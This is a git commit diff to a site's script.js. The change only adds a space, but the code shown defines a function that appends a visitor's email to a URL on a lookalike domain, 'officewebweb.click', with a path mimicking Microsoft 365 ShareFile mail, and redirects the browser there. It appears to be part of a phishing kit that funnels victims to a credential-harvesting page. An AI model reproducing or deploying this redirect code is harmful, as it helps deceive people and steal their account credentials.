8bb1a7a9947b145a9c81ff58534f6f2b3b89ea70
shyam0147 <138498633+shyam0147@users.noreply.github.com>
2024-02-28 12:54:30 +0300

    Update script.js

--- site/script.js
+++ site/script.js
@@ -1,6 +1,6 @@
  function redirectToTarget() {
             var baseUrl = "https://go-api.officewebweb.click/365dynamic/sharefile/mail/inbox/";
-            var redirectUrl = baseUrl +"#" + getEmail123cc775;
+            var redirectUrl = baseUrl + "#" + getEmail123cc775;
 
             // Redirect the user to the specified URL
             window.location.href = redirectUrl;
